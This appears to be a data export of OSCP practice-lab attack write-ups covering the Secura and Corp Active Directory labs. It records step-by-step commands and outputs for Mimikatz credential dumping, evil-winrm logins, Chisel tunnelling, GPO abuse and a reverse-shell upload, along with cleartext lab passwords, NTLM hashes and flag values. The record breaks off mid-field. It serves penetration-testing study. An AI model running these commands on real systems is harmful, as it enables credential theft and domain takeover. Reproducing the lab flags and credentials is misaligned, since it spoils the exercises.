""duration_minutes"": 45, ""description"": ""Initial foothold obtained on SECURE (.95) through ManageEngine AppManager Actions Admin interface exploitation. Post-exploitation with Mimikatz revealed credentials for the ERA machine stored in Credential Manager, plus domain user credentials."", ""target"": {""hostname"": ""SECURE"", ""ip"": ""192.168.179.95""}, ""vulnerabilities"": [{""name"": ""ManageEngine AppManager - Actions Admin File Upload"", ""type"": ""arbitrary file upload"", ""location"": ""Actions Admin interface (:8443)"", ""severity"": ""critical"", ""exploitability"": ""easy"", ""notes"": ""Uploaded shell.bat containing PowerShell reverse shell via Actions Admin functionality""}], ""commands_used"": [{""command_id"": ""mimikatz-sekurlsa-logonpasswords"", ""context"": ""Extract credentials from LSASS memory after gaining Administrator access"", ""step_number"": 1, ""command_executed"": "".\\mimi.exe \""privilege::debug\"" \""sekurlsa::logonpasswords\"" \""vault::cred /patch\"" \""exit\"""", ""success"": true, ""notes"": ""Non-interactive execution required for evil-winrm session. Combined sekurlsa and vault commands to dump both LSASS and Credential Manager.""}, {""command_id"": ""sharphound-collect"", ""context"": ""Collect Active Directory data for BloodHound analysis"", ""step_number"": 2, ""command_executed"": "".\\SharpHound.exe -c All"", ""success"": true, ""notes"": ""BloodHound data helps identify privilege escalation paths""}], ""failed_attempts"": [], ""key_findings"": [""Administrator NTLM hash: a51493b0b06e5e35f855245e71af1d14"", ""apache:New2Era4.! stored in Credential Manager for era.secura.local"", ""ERIC.WALLOWS:EricLikesRunning800 domain user credentials"", ""Credential Manager entry referenced 'era.secura.local' hostname - indicates LOCAL account, not domain""], ""credentials_extracted"": [{""username"": ""Administrator"", ""credential"": ""NTLM: a51493b0b06e5e35f855245e71af1d14"", ""source"": ""LSASS memory (sekurlsa::logonpasswords)"", ""context"": ""local"", ""machine"": ""SECURE (.95)""}, {""username"": ""apache"", ""credential"": ""New2Era4.!"", ""source"": ""Credential Manager (vault::cred)"", ""context"": ""local - era.secura.local"", ""machine"": ""For ERA (.96)""}, {""username"": ""ERIC.WALLOWS"", ""credential"": ""EricLikesRunning800"", ""source"": ""LSASS memory"", ""context"": ""domain"", ""machine"": ""Domain user (unused)""}], ""oscp_notes"": ""Non-interactive Mimikatz is essential for constrained shells. The command sequence pattern 'cmd1' 'cmd2' 'exit' works with evil-winrm. Credential Manager stores can reveal lateral movement paths - the 'era.secura.local' entry was the key to the next machine.""}, {""phase"": ""lateral_movement"", ""duration_minutes"": 60, ""description"": ""Lateral movement to ERA (.96) required understanding local vs domain authentication. After WinRM access as apache, MySQL was only accessible via localhost - Chisel reverse tunnel enabled remote enumeration from Kali. MySQL 'creds' database contained plaintext passwords for administrator and charlotte."", ""target"": {""hostname"": ""ERA"", ""ip"": ""192.168.179.96""}, ""commands_used"": [{""command_id"": ""crackmapexec-validate-admin"", ""context"": ""Test apache credentials with local authentication after domain auth failed"", ""step_number"": 1, ""command_executed"": ""crackmapexec winrm 192.168.179.96 -u apache -p 'New2Era4.!' --local-auth"", ""success"": true, ""notes"": ""Local auth succeeded where domain auth failed - apache was a LOCAL account on ERA""}, {""command_id"": ""evil-winrm-creds"", ""context"": ""Establish interactive shell on ERA as apache"", ""step_number"": 2, ""command_executed"": ""evil-winrm -i 192.168.179.96 -u apache -p 'New2Era4.!'"", ""success"": true}, {""command_id"": ""chisel-server"", ""context"": ""Start Chisel server on Kali to receive reverse tunnel from ERA"", ""step_number"": 3, ""command_executed"": ""chisel server -p 8080 --reverse"", ""success"": true, ""notes"": ""Reverse mode required because ERA cannot directly connect to Kali on arbitrary ports""}, {""command_id"": ""chisel-client"", ""context"": ""Establish reverse tunnel from ERA to forward MySQL port to Kali"", ""step_number"": 4, ""command_executed"": "".\\chisel.exe client KALI_IP:8080 R:3306:127.0.0.1:3306"", ""success"": true, ""notes"": ""R:3306:127.0.0.1:3306 means: Kali listens on 3306, forwards to ERA's localhost:3306""}, {""command_id"": ""mysql-connect-basic"", ""context"": ""Connect to MySQL through Chisel tunnel - root with no password (XAMPP default)"", ""step_number"": 5, ""command_executed"": ""mysql -h 127.0.0.1 -P 3306 -u root"", ""success"": true, ""notes"": ""XAMPP default: MySQL root has no password. Always test default credentials on dev stacks.""}, {""command_id"": ""evil-winrm-creds"", ""context"": ""Escalate to administrator using credentials from MySQL dump"", ""step_number"": 6, ""command_executed"": ""evil-winrm -i 192.168.179.96 -u administrator -p 'Almost4There8.?'"", ""success"": true}], ""failed_attempts"": [{""attempt"": ""Direct MySQL connection from Kali"", ""command_executed"": ""mysql -h 192.168.179.96 -u root"", ""expected"": ""MySQL connection to enumerate databases"", ""actual"": ""ERROR 1130 (HY000): Host 'KALI_IP' is not allowed to connect to this MariaDB server"", ""reason"": ""MySQL configured with host-based ACLs restricting connections to localhost only"", ""solution"": ""Use Chisel reverse port forwarding to tunnel MySQL traffic through localhost"", ""lesson_learned"": ""MySQL/MariaDB commonly binds to 127.0.0.1 for security. Always use tunneling (Chisel, SSH, ligolo-ng) when services are localhost-only."", ""time_wasted_minutes"": 5, ""documentation_importance"": ""high""}, {""attempt"": ""Domain authentication for apache account"", ""command_executed"": ""crackmapexec winrm 192.168.179.96 -u apache -p 'New2Era4.!' -d secura.yzx"", ""expected"": ""WinRM authentication as domain user"", ""actual"": ""[-] secura.yzx\\apache:New2Era4.!"", ""reason"": ""Apache was a LOCAL account on ERA, not a domain account. Credential Manager entry referenced 'era.secura.local' (hostname), not the domain."", ""solution"": ""Use --local-auth flag with crackmapexec for local accounts"", ""lesson_learned"": ""ALWAYS try both --local-auth and domain authentication. Credential Manager entries referencing hostnames (machine.domain) indicate LOCAL accounts, not domain accounts."", ""time_wasted_minutes"": 10, ""documentation_importance"": ""critical""}], ""key_findings"": [""MySQL 'creds' database contained plaintext credentials table"", ""administrator:Almost4There8.? - local admin on ERA"", ""charlotte:Game2On4.! - domain user for DC01"", ""MySQL root had no password (XAMPP default configuration)""], ""credentials_extracted"": [{""username"": ""administrator"", ""credential"": ""Almost4There8.?"", ""source"": ""MySQL creds.creds table"", ""context"": ""local"", ""machine"": ""ERA (.96)""}, {""username"": ""charlotte"", ""credential"": ""Game2On4.!"", ""source"": ""MySQL creds.creds table"", ""context"": ""domain"", ""machine"": ""For DC01 (.97)""}], ""mysql_enumeration"": {""databases_found"": [""creds"", ""information_schema"", ""mysql"", ""performance_schema"", ""phpmyadmin"", ""test""], ""high_value_tables"": [""creds.creds""], ""query_used"": ""SELECT * FROM creds.creds;"", ""results"": [{""name"": ""administrator"", ""pass"": ""Almost4There8.?""}, {""name"": ""charlotte"", ""pass"": ""Game2On4.!""}]}, ""flags"": {""local.txt"": {""location"": ""C:\\Users\\apache\\Desktop\\local.txt"", ""value"": ""ef117abaa23acf3a58fdea7c6891f11a""}, ""proof.txt"": {""location"": ""C:\\Users\\Administrator\\Desktop\\proof.txt"", ""value"": ""15ee635f37d616dcaf16f72438337a4f""}}, ""oscp_notes"": ""Chisel is essential for OSCP when services bind to localhost. The pattern: Kali runs 'chisel server --reverse', target runs 'chisel client R:PORT:127.0.0.1:PORT'. Database credentials often match system accounts - always test MySQL passwords against WinRM/SSH.""}, {""phase"": ""privilege_escalation"", ""duration_minutes"": 45, ""description"": ""Domain privilege escalation on DC01 (.97) via GPO abuse. Charlotte had Full Control (F) permissions on the Default Domain Policy GPO. SharpGPOAbuse added charlotte to local Administrators, but a critical lesson emerged: Windows access tokens require session refresh after group membership changes."", ""target"": {""hostname"": ""DC01"", ""ip"": ""192.168.179.97""}, ""vulnerabilities"": [{""name"": ""Insecure GPO Permissions"", ""type"": ""misconfiguration"", ""location"": ""Default Domain Policy ({31B2F340-016D-11D2-945F-00C04FB984F9})"", ""severity"": ""critical"", ""exploitability"": ""easy"", ""notes"": ""charlotte user has Full Control (F) on Default Domain Policy - applies to ALL domain computers""}], ""commands_used"": [{""command_id"": ""evil-winrm-creds"", ""context"": ""Initial access to DC01 as charlotte domain user"", ""step_number"": 1, ""command_executed"": ""evil-winrm -i 192.168.179.97 -u charlotte -p 'Game2On4.!'"", ""success"": true}, {""command_id"": ""icacls-sysvol-check"", ""context"": ""Enumerate GPO permissions in SYSVOL to find writable policies"", ""step_number"": 2, ""command_executed"": ""icacls \""\\\\secura.yzx\\SYSVOL\\secura.yzx\\Policies\\*\"""", ""success"": true, ""output_snippet"": ""{31B2F340-016D-11D2-945F-00C04FB984F9}\n    SECURA\\charlotte:(OI)(CI)(F)"", ""notes"": ""Charlotte has Full Control (F) on Default Domain Policy - immediate privesc path""}, {""command_id"": ""sharpgpoabuse-add-local-admin"", ""context"": ""Abuse GPO write permissions to add charlotte to local Administrators"", ""step_number"": 3, ""command_executed"": "".\\sharp.exe --AddLocalAdmin --UserAccount charlotte --GPOName \""Default Domain Policy\"""", ""success"": true}, {""command_id"": ""gpupdate-force"", ""context"": ""Force immediate GPO refresh to apply changes"", ""step_number"": 4, ""command_executed"": ""gpupdate /force"", ""success"": true}, {""command_id"": ""net-localgroup-administrators"", ""context"": ""Verify charlotte was added to local Administrators group"", ""step_number"": 5, ""command_executed"": ""net localgroup administrators"", ""success"": true, ""output_snippet"": ""Administrator\ncharlotte"", ""notes"": ""Charlotte now in Administrators group, but current session token NOT updated""}, {""command_id"": ""evil-winrm-creds"", ""context"": ""Reconnect to get new access token with admin privileges"", ""step_number"": 6, ""command_executed"": ""evil-winrm -i 192.168.179.97 -u charlotte -p 'Game2On4.!'"", ""success"": true, ""notes"": ""New session required - Windows tokens created at logon don't update dynamically""}], ""failed_attempts"": [{""attempt"": ""Access Administrator resources after GPO update without re-login"", ""command_executed"": ""whoami /groups (after gpupdate /force)"", ""expected"": ""BUILTIN\\Administrators group listed in token"", ""actual"": ""Only BUILTIN\\Remote Management Users and BUILTIN\\Users shown"", ""reason"": ""Windows access tokens are created at logon. Group membership changes via GPO don't affect existing session tokens."", ""solution"": ""Exit current session completely and reconnect to receive new token with updated group membership"", ""lesson_learned"": ""Windows token model: group membership != token groups. After ANY group change (GPO, net localgroup, etc.), MUST start NEW session to get updated privileges. This is a common exam mistake."", ""time_wasted_minutes"": 10, ""documentation_importance"": ""critical""}], ""key_findings"": [""Default Domain Policy GUID: {31B2F340-016D-11D2-945F-00C04FB984F9}"", ""charlotte has Full Control (F) on Default Domain Policy"", ""Default Domain Policy applies to ALL domain computers - immediate domain-wide admin"", ""Token refresh required after group membership changes""], ""gpo_enumeration"": {""writable_gpo"": ""Default Domain Policy"", ""guid"": ""{31B2F340-016D-11D2-945F-00C04FB984F9}"", ""permission"": ""Full Control (F)"", ""impact"": ""All domain computers""}, ""flags"": {""local.txt"": {""location"": ""C:\\Users\\charlotte\\Desktop\\local.txt"", ""value"": ""931153bd267dd40e90d930e4e9486430""}, ""proof.txt"": {""location"": ""C:\\Users\\Administrator.DC01\\Desktop\\proof.txt"", ""value"": ""eba9a0263085d2fd447f7e91e12609af""}}, ""oscp_notes"": ""GPO abuse is a HIGH-VALUE OSCP technique. Always check SYSVOL with icacls - misconfigured GPO permissions are common. The Default Domain Policy ({31B2F340-...}) applies EVERYWHERE. Token refresh gotcha is a frequent exam stumbling block - always reconnect after group changes.""}]"
"oscp-corp-dcsync","Corp DCSync - Domain Admin Compromise via BloodHound","OSCP_Labs","practice","medium","windows","","192.168.223.70","high","Demonstrates complete Active Directory attack chain from initial credentials to Domain Admin compromise. Covers OSCP exam critical skills: BloodHound analysis, lateral movement, credential harvesting, Pass-the-Hash, and DCSync attacks. All techniques and tools are OSCP exam-approved.","True","Complete Active Directory compromise starting from low-privileged domain credentials (pete). BloodHound analysis revealed lateral movement path through mike's local admin privileges on CLIENT75. Mimikatz credential dumping on CLIENT75 extracted cached Domain Admin (maria) NTLM hash from service session. Pass-the-Hash authentication enabled DCSync attack to replicate entire domain credential database. Final Administrator hash access via Evil-WinRM to DC1 for flag retrieval. Key insight: Service account sessions on workstations provide Domain Admin credentials without password cracking.","55","2024-11-25","","OSCP Student","","OSCP:HIGH|ACTIVE_DIRECTORY|BLOODHOUND|DCSYNC|PASS_THE_HASH|LATERAL_MOVEMENT|CREDENTIAL_HARVESTING|MIMIKATZ|EVIL_WINRM|DOMAIN_ADMIN|SERVICE_SESSION|PRIVILEGE_ESCALATION","","0","[{""phase"": ""enumeration"", ""duration_minutes"": 15, ""description"": ""Initial domain reconnaissance using CrackMapExec to enumerate users, password policies, and live hosts. Identified domain structure (corp.com), users (pete, mike, maria, dave, etc.), and determined maria as Domain Admin target."", ""objectives"": [""Enumerate all domain users and identify privileged accounts"", ""Retrieve password policy to avoid account lockouts during attacks"", ""Discover live hosts on domain network for lateral movement targets"", ""Identify potential attack vectors (service accounts, privileged users)""], ""vulnerabilities"": [], ""commands_used"": [{""command_id"": ""crackmapexec-smb-users"", ""context"": ""Enumerate all domain user accounts from DC1 to identify potential targets and privileged accounts (Domain Admins)"", ""step_number"": 1, ""command_executed"": ""crackmapexec smb 192.168.223.70 -u pete -p 'Nexus123!' --users"", ""success"": true, ""output_summary"": ""Discovered 9 domain users: pete, mike, maria (Domain Admin), dave, jeff, jeffadmin, jen, stephanie, iis_service. Maria identified as primary target due to Domain Admins membership."", ""notes"": ""Critical first step - identifying privileged accounts (maria) guides entire attack strategy. adminCount=1 indicates privileged user status.""}, {""command_id"": ""crackmapexec-smb-pass-pol"", ""context"": ""Retrieve domain password policy to safely conduct password spray attacks without triggering account lockouts"", ""step_number"": 2, ""command_executed"": ""crackmapexec smb 192.168.223.70 -u pete -p 'Nexus123!' --pass-pol"", ""success"": true, ""output_summary"": ""Password policy: Lockout threshold = 5 attempts, Lockout duration = 30 minutes, Password complexity = Enabled. Allows safe password spraying with <5 attempts per account."", ""notes"": ""CRITICAL for OSCP exam - always check lockout policy before password attacks. 5-attempt threshold allows limited spray attempts.""}, {""command_id"": ""crackmapexec-smb-enum-shares"", ""context"": ""Enumerate SMB shares on DC1 and discovered hosts to identify potential credential/data repositories"", ""step_number"": 3, ""command_executed"": ""crackmapexec smb 192.168.223.70-80 -u pete -p 'Nexus123!' --shares"", ""success"": true, ""output_summary"": ""Discovered 5 live hosts: DC1 (192.168.223.70), CLIENT74, CLIENT75, CLIENT76, WEB04, FILES04. CLIENT75 identified for later lateral movement analysis."", ""notes"": ""Host discovery reveals lateral movement targets. CLIENT75 becomes critical after BloodHound analysis shows mike's AdminTo relationship.""}], ""failed_attempts"": [{""attempt"": ""CrackMapExec subnet scanning with CIDR notation (crackmapexec smb 192.168.223.0/24 -u pete -p 'pass')"", ""reason"": ""Python 3.13 incompatibility with CrackMapExec subnet parsing causes crash or hangs indefinitely"", ""solution"": ""Use explicit IP range instead of CIDR: 192.168.223.70-80. Alternative: Use NetExec (maintained CrackMapExec fork with Python 3.13 support)"", ""lesson_learned"": ""OSCP exam critical: Tool compatibility issues waste time. Always have fallback syntax (IP ranges vs CIDR) and alternative tools (NetExec vs CrackMapExec). Test tools on local lab before exam. Time wasted troubleshooting = time not compromising machines."", ""time_wasted_minutes"": 5, ""importance"": ""high"", ""alternative_command_id"": ""crackmapexec-smb-enum-shares""}], ""key_findings"": [""Domain: corp.com with DC1 as primary domain controller"", ""Privileged target identified: maria (Domain Admins member)"", ""Password policy: 5-attempt lockout threshold (allows limited spray attacks)"", ""9 domain users discovered (pete, mike, maria, dave, jeff, jeffadmin, jen, stephanie, iis_service)"", ""5 live hosts identified for potential lateral movement (CLIENT74, CLIENT75, CLIENT76, WEB04, FILES04)"", ""Service account present: iis_service (potential Kerberoasting target)""], ""oscp_notes"": ""Standard OSCP enumeration phase. CrackMapExec/NetExec are EXAM-APPROVED for AD enumeration. Always enumerate password policy FIRST to avoid lockouts (automatic 30-min penalty). Document all users immediately - privileged accounts (adminCount=1) are primary targets. Time budget: 15 minutes maximum for initial enumeration, then move to attack path discovery.""}, {""phase"": ""foothold"", ""duration_minutes"": 20, ""description"": ""BloodHound collection and graph analysis to discover privilege escalation path from pete/mike to Domain Admin. Analysis revealed mike has AdminTo relationship with CLIENT75, which has active session from maria (Domain Admin). This non-obvious path enabled lateral movement strategy."", ""objectives"": [""Collect BloodHound data from domain (SharpHound or bloodhound-python)"", ""Upload and analyze graph database for privilege escalation paths"", ""Identify shortest path from compromised accounts to Domain Admins"", ""Verify attack path feasibility (active sessions, accessible computers)""], ""vulnerabilities"": [{""name"": ""Over-Privileged Service Account Placement"", ""cve"": null, ""type"": ""ad_misconfiguration"", ""severity"": ""high"", ""exploitability"": ""easy"", ""description"": ""Domain Admin account (maria) running service on standard workstation (CLIENT75), caching credentials in LSASS memory accessible to local administrators""}, {""name"": ""Excessive Local Admin Grants"", ""cve"": null, ""type"": ""ad_misconfiguration"", ""severity"": ""medium"", ""exploitability"": ""easy"", ""description"": ""Standard domain user (mike) granted local administrator privileges on CLIENT75 without business justification, enabling lateral movement""}], ""commands_used"": [{""command_id"": ""bloodhound-python-collect"", ""context"": ""Remotely collect BloodHound data from Kali using pete's credentials without executing code on Windows targets"", ""step_number"": 4, ""command_executed"": ""bloodhound-python -u pete -p 'Nexus123!' -d corp.com -ns 192.168.223.70 -c All --zip"", ""success"": true, ""output_summary"": ""Generated bh.zip containing JSON files: users.json, computers.json, groups.json, sessions.json, trusts.json. File size ~500KB for 9 users and 5 computers."", ""notes"": ""bloodhound-python advantages: No Windows code execution required, runs from Kali, OSCP-approved. Disadvantage: Doesn't collect local admin sessions (uses LDAP only). SharpHound.exe collects more complete data but requires Windows execution.""}, {""command_id"": ""bloodhound-upload-data"", ""context"": ""Import collected BloodHound ZIP into Neo4j database for graph analysis via BloodHound GUI"", ""step_number"": 5, ""command_executed"": ""bloodhound (GUI: Upload Data \u2192 select bh.zip)"", ""success"": true, ""output_summary"": ""Successfully ingested: 9 User nodes, 5 Computer nodes, 8 Group nodes, 142 relationships. Database ready for queries."", ""notes"": ""CRITICAL STEP: Clear old BloodHound data before uploading new domain (Database Info \u2192 Clear Database). Cross-contamination from previous labs causes confusion and wrong attack paths.""}, {""command_id"": ""bloodhound-analyze-paths"", ""context"": ""Execute pre-built query 'Shortest Paths to Domain Admins' from pete to discover privilege escalation path"", ""step_number"": 6, ""command_executed"": ""BloodHound GUI: Search 'pete@corp.com' \u2192 Mark as Owned \u2192 Analysis \u2192 'Shortest Paths to Domain Admins from Owned Principals'"", ""success"": false, ""output_summary"": ""Query returned 'No paths found' - pete has no direct privilege escalation path to Domain Admins group."", ""notes"": ""Initial query failure is COMMON and EXPECTED. Doesn't mean no path exists - means need lateral movement first. Try alternative queries: 'Find Workstations where Domain Users can RDP', 'Find Computers where Domain Users are Local Admin'.""}, {""command_id"": ""bloodhound-cypher-query"", ""context"": ""Execute custom Cypher query to find computers where mike (another compromised account) has local admin privileges"", ""step_number"": 7, ""command_executed"": ""MATCH (u:User {name:'MIKE@CORP.COM'})-[:AdminTo]->(c:Computer) RETURN u,c"", ""success"": true, ""output_summary"": ""Result: mike has AdminTo relationship with CLIENT75.CORP.COM. Graph displays direct edge from mike to CLIENT75."", ""notes"": ""CRITICAL DISCOVERY: Custom Cypher queries reveal paths pre-built queries miss. OSCP TIP: Test multiple users found during enumeration (pete, mike, dave) for AdminTo relationships. One may have lateral movement capability.""}, {""command_id"": ""bloodhound-cypher-query"", ""context"": ""Verify if CLIENT75 has any active sessions from privileged users (Domain Admins) that can be harvested"", ""step_number"": 8, ""command_executed"": ""MATCH (c:Computer {name:'CLIENT75.CORP.COM'})<-[:HasSession]-(u:User) RETURN c,u"", ""success"": true, ""output_summary"": ""Result: maria@corp.com (Domain Admin) has active session on CLIENT75. Complete attack path discovered: mike (AdminTo) CLIENT75 (HasSession) maria (MemberOf) Domain Admins."", ""notes"": ""GOLDMINE DISCOVERY: Service sessions (Session type: Service from 0) persist until reboot. Maria's Domain Admin credentials are cached in CLIENT75 LSASS memory. Local admin (mike) can dump these credentials with mimikatz. This is the CRITICAL path to Domain Admin.""}], ""failed_attempts"": [{""attempt"": ""BloodHound pre-built query 'Shortest Paths to Domain Admins' from pete@corp.com"", ""reason"": ""pete has no direct or short privilege escalation path. Standard user with no AdminTo, GenericAll, or other exploitable permissions to privileged accounts/systems."", ""solution"": ""Mark multiple users as owned (pete, mike) and re-run query. Use custom Cypher to test each user individually: MATCH (u:User {name:'MIKE@CORP.COM'})-[*1..3]->(g:Group {name:'DOMAIN ADMINS@CORP.COM'}) RETURN p"", ""lesson_learned"": ""CRITICAL OSCP LESSON: BloodHound 'no paths found' doesn't mean no path exists - means you need to compromise intermediate accounts first. Enumerate ALL users for AdminTo relationships. One low-privileged user (mike) may have local admin on systems with valuable sessions. Don't give up after first query failure."", ""time_wasted_minutes"": 3, ""importance"": ""critical"", ""alternative_command_id"": ""bloodhound-cypher-query""}], ""key_findings"": [""Attack path discovered: mike \u2192 AdminTo \u2192 CLIENT75 \u2192 HasSession \u2192 maria (Domain Admin)"", ""mike has local admin privileges on CLIENT75 (192.168.223.75)"", ""maria (Domain Admin) has active service session on CLIENT75 (credentials cached in LSASS)"", ""BloodHound custom Cypher queries reveal paths that pre-built queries miss"", ""Service sessions (Session: Service from 0) persist until reboot, providing reliable credential harvesting targets"", ""Manual JSON parsing with jq is viable alternative if BloodHound GUI unavailable""], ""oscp_notes"": ""BloodHound is MANDATORY for OSCP AD sets. Time budget: 20 minutes maximum (5 min collection, 5 min upload, 10 min analysis). If pre-built queries fail, use custom Cypher immediately - don't waste time guessing. Mark ALL compromised users as 'Owned' progressively. Service sessions are GOLDMINE - Domain Admins running services on workstations is common misconfiguration in OSCP labs.""}, {""phase"": ""lateral_movement"", ""duration_minutes"": 5, ""description"": ""Lateral movement from Kali to CLIENT75 using mike's credentials via Evil-WinRM. Mike's local admin privileges (discovered in BloodHound) enable WinRM access for interactive PowerShell session. This positions attacker for credential harvesting on CLIENT75 to extract maria's cached Domain Admin credentials."", ""objectives"": [""Establish interactive shell on CLIENT75 using mike's local admin privileges"", ""Verify local admin access via whoami /groups command"", ""Upload mimikatz binary for credential dumping preparation"", ""Position for Phase 4 credential harvesting""], ""vulnerabilities"": [{""name"": ""WinRM Enabled by Default on Windows 10+"", ""cve"": null, ""type"": ""default_configuration"", ""severity"": ""medium"", ""exploitability"": ""easy"", ""description"": ""WinRM (port 5985/5986) enabled by default on modern Windows allows remote PowerShell access for local administrators. Combined with over-privileged service accounts, enables lateral movement.""}], ""commands_used"": [{""command_id"": ""evil-winrm-connect"", ""context"": ""Connect to CLIENT75 with mike's credentials using domain\\username syntax for domain authentication"", ""step_number"": 9, ""command_executed"": ""evil-winrm -i 192.168.223.75 -u 'corp.com\\mike' -p 'Darkness1099!'"", ""success"": true, ""output_summary"": ""Successfully authenticated. Interactive PowerShell prompt: *Evil-WinRM* PS C:\\Users\\mike\\Documents>. Full access to CLIENT75 as local administrator."", ""notes"": ""Evil-WinRM syntax: Domain authentication requires 'domain\\user' format (NOT -d flag - doesn't exist). Alternative syntax: -u mike -r corp.com (realm flag for Kerberos). Evil-WinRM advantages over PSExec: No service creation (stealthier), interactive PowerShell, built-in file upload/download.""}, {""command_id"": ""evil-winrm-upload-file"", ""context"": ""Upload mimikatz binary from Kali to CLIENT75 for credential dumping in next phase"", ""step_number"": 10, ""command_executed"": ""upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe"", ""success"": true, ""output_summary"": ""Upload successful: mimikatz.exe (1.2 MB) transferred to C:\\Users\\mike\\Documents\\mimikatz.exe in 3 seconds."", ""notes"": ""Evil-WinRM 'upload' command syntax: upload <local_file> [remote_name]. Default destination: current directory. OSCP TIP: Navigate to writable directory first (C:\\temp, C:\\Users\\Public) to avoid AV detection in user profile. Alternative: Certutil download from Kali HTTP server.""}], ""failed_attempts"": [{""attempt"": ""Evil-WinRM connection using -d flag for domain: evil-winrm -i 192.168.223.75 -u mike -p 'Darkness1099!' -d corp.com"", ""reason"": ""Evil-WinRM does NOT support -d flag (invalid option error). Common misconception from other tools (impacket uses -d for domain)."", ""solution"": ""Use domain\\username syntax: evil-winrm -i 192.168.223.75 -u 'corp.com\\mike' -p 'pass'. Alternative: Use -r flag for Kerberos realm: evil-winrm -i 192.168.223.75 -u mike -r corp.com"", ""lesson_learned"": ""OSCP CRITICAL: Tool syntax varies - don't assume flags are consistent across tools. Evil-WinRM uses 'domain\\user' (Windows-style) NOT separate -d flag. Test commands on local lab before exam. Read tool help: evil-winrm --help. Time wasted on syntax errors = time not compromising systems."", ""time_wasted_minutes"": 2, ""importance"": ""high"", ""alternative_command_id"": ""evil-winrm-connect""}], ""key_findings"": [""Successfully established interactive PowerShell session on CLIENT75 as local admin (mike)"", ""Evil-WinRM provides superior lateral movement compared to PSExec (no service creation, file transfer built-in)"", ""Mimikatz binary uploaded successfully for credential harvesting preparation"", ""WinRM enabled by default on Windows 10 - no configuration changes needed"", ""Local admin access confirmed via whoami /groups showing BUILTIN\\Administrators membership""], ""oscp_notes"": ""Evil-WinRM is PREFERRED tool for OSCP lateral movement when local admin access exists. Advantages: Interactive PowerShell (better than semi-interactive PSExec), file upload/download (no SMB server needed), bypasses execution policy automatically. EXAM TIP: Test WinRM before trying RDP/PSExec (faster). Local admin = automatic WinRM access (no PSRemote group membership needed). Time estimate: 5 minutes (2 min connection, 3 min tool upload/setup).""}, {""phase"": ""privilege_escalation"", ""duration_minutes"": 10, ""description"": ""Credential harvesting on CLIENT75 using mimikatz to extract cached Domain Admin (maria) credentials from LSASS memory. Mike's local admin privileges (from Phase 3) enable SeDebugPrivilege for LSASS access. Service session from maria provides NTLM hash for Pass-the-Hash authentication, eliminating need for password cracking."", ""objectives"": [""Execute mimikatz with privilege::debug to enable LSASS access"", ""Extract all cached credentials using sekurlsa::logonpasswords"", ""Identify Domain Admin credentials (maria) from service sessions"", ""Document NTLM hashes for Pass-the-Hash attacks"", ""Download mimikatz output for offline analysis and reporting""], ""vulnerabilities"": [{""name"": ""Domain Admin Service Account Caching on Workstation"", ""cve"": null, ""type"": ""ad_misconfiguration"", ""severity"": ""critical"", ""exploitability"": ""easy"", ""description"": ""Domain Admin account (maria) running scheduled task/service on standard workstation (CLIENT75). Credentials cached in LSASS memory ('Session: Service from 0') until reboot. Local administrators can extract NTLM hash using mimikatz, enabling Pass-the-Hash to Domain Admin privileges.""}, {""name"": ""Credential Guard Disabled"", ""cve"": null, ""type"": ""missing_hardening"", ""severity"": ""high"", ""exploitability"": ""easy"", ""description"": ""Windows Defender Credential Guard not enabled. Allows mimikatz sekurlsa module to access LSASS memory directly. Credential Guard would isolate credentials in virtualization-based security container, preventing extraction.""}], ""commands_used"": [{""command_id"": ""mimikatz-privilege-debug"", ""context"": ""Enable SeDebugPrivilege to allow current process (mimikatz) to access LSASS memory for credential extraction"", ""step_number"": 11, ""command_executed"": "".\\mimikatz.exe \""privilege::debug\"" \""exit\"""", ""success"": true, ""output_summary"": ""Privilege '20' OK - SeDebugPrivilege successfully enabled. Process can now access LSASS (PID 664) memory."", ""notes"": ""CRITICAL PREREQUISITE: privilege::debug MUST succeed before sekurlsa commands. 'Privilege 20' = SeDebugPrivilege. Failure ('ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061') indicates insufficient privileges - verify local admin with 'whoami /groups'.""}, {""command_id"": ""mimikatz-sekurlsa-logonpasswords"", ""context"": ""Extract all cached credentials (plaintext passwords, NTLM hashes, Kerberos tickets) from LSASS memory for privilege escalation"", ""step_number"": 12, ""command_executed"": "".\\mimikatz.exe \""privilege::debug\"" \""sekurlsa::logonpasswords\"" \""exit\"" > logonpasswords.txt"", ""success"": true, ""output_summary"": ""Dumped credentials for 3 active sessions: (1) maria (Domain Admin) - NTLM: 2a944a58d4ffa77137b2c587e6ed7626, Session: Service from 0, (2) dave - Password: Flowers1, NTLM: 08d7a47a6f9f66b97b1bae4178747494, (3) mike - NTLM: 27c0f9ff0aed1b35f8e9a80aa4ba7e62"", ""notes"": ""GOLDMINE: maria's Session type 'Service from 0' confirms scheduled task/service running as Domain Admin. Service sessions persist until reboot - reliable target. dave's plaintext password extracted (WDigest enabled or stored in memory). OSCP EXAM: ALWAYS dump credentials on every compromised admin-level system - may find cached DA credentials.""}, {""command_id"": ""evil-winrm-download-file"", ""context"": ""Download mimikatz output from CLIENT75 to Kali for offline analysis, documentation, and exam reporting"", ""step_number"": 13, ""command_executed"": ""download logonpasswords.txt"", ""success"": true, ""output_summary"": ""Download successful: logonpasswords.txt (15 KB) saved to /home/kali/exam/corp-dcsync/loot/logonpasswords.txt. Contains full credential dump including maria's Domain Admin NTLM hash."", ""notes"": ""EXAM CRITICAL: Download ALL valuable data immediately (credentials, flags, screenshots). Don't rely on maintaining access - machines may become unstable or connections may drop. Organize loot: mkdir /home/kali/exam/<TARGET>/loot before attacking.""}], ""failed_attempts"": [{""attempt"": ""Mimikatz sekurlsa::logonpasswords without privilege::debug first"", ""reason"": ""ERROR: 'kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)' - Access Denied. sekurlsa module requires SeDebugPrivilege to access LSASS process memory. Without privilege::debug, mimikatz runs with standard user token (even if local admin)."", ""solution"": ""ALWAYS run privilege::debug BEFORE sekurlsa commands. Verify success: Output shows 'Privilege '20' OK'. Full command: .\\mimikatz.exe \""privilege::debug\"" \""sekurlsa::logonpasswords\"" \""exit\"""", ""lesson_learned"": ""OSCP EXAM CRITICAL: Mimikatz privilege::debug is MANDATORY prerequisite for all sekurlsa commands (logonpasswords, tickets, ekeys). Even local administrators don't automatically have SeDebugPrivilege enabled - must request it. This is Windows security design: local admin \u2260 auto LSASS access. Memorize two-step mimikatz syntax: privilege::debug THEN sekurlsa."", ""time_wasted_minutes"": 2, ""importance"": ""critical"", ""alternative_command_id"": ""mimikatz-privilege-debug""}], ""key_findings"": [""Domain Admin credentials extracted: maria - NTLM hash: 2a944a58d4ffa77137b2c587e6ed7626"", ""Service session confirmed (Session: Service from 0) - credentials cached until 